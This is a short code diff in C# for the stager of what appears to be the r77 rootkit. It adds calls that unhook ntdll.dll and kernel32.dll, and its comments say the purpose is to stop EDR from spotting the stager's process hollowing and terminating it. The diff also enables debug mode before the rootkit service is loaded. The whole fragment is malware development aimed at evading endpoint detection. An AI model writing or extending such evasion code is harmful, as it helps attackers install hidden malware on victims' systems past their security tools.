@@ -17,6 +17,16 @@ public static class Program
 	// To immediately spot code that is incompatible with .NET 3.5, the target framework is set to .NET 3.5.
 	public static void Main()
 	{
+		// Unhook DLL's that are monitored by EDR.
+		// Otherwise, the call sequence analysis of process hollowing gets detected and the stager is terminated.
+		Unhook.UnhookDll("ntdll.dll");
+		if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8)
+		{
+			// Unhooking kernel32.dll on Windows 7 x86 fails.
+			//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
+			Unhook.UnhookDll("kernel32.dll");
+		}
+
 		Process.EnterDebugMode();
 
 		// Get r77 service executable.
